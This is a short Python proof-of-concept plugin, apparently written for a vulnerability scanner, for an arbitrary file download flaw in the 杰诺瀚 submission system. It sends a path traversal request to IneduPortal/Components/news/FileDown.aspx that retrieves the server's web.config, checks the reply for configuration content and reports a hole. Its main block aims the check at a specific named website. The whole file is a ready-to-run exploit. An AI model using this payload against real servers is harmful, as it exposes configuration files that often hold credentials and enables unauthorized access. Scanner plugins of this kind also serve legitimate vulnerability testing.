#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 杰诺瀚投稿系统任意文件下载
Author    :  a
mail      :  a@lcx.cc
 

"""
def assign(service, arg): 
    if service == "haohan": 
        return True, arg 
def audit(arg):
    payload ="IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and 'filename=web.config' in head and '<configSections>' in res: 
        security_hole(target) 
if __name__ == '__main__': 
    from dummy import *
    audit(assign('haohan','http://www.hzjwxx.com/')[1])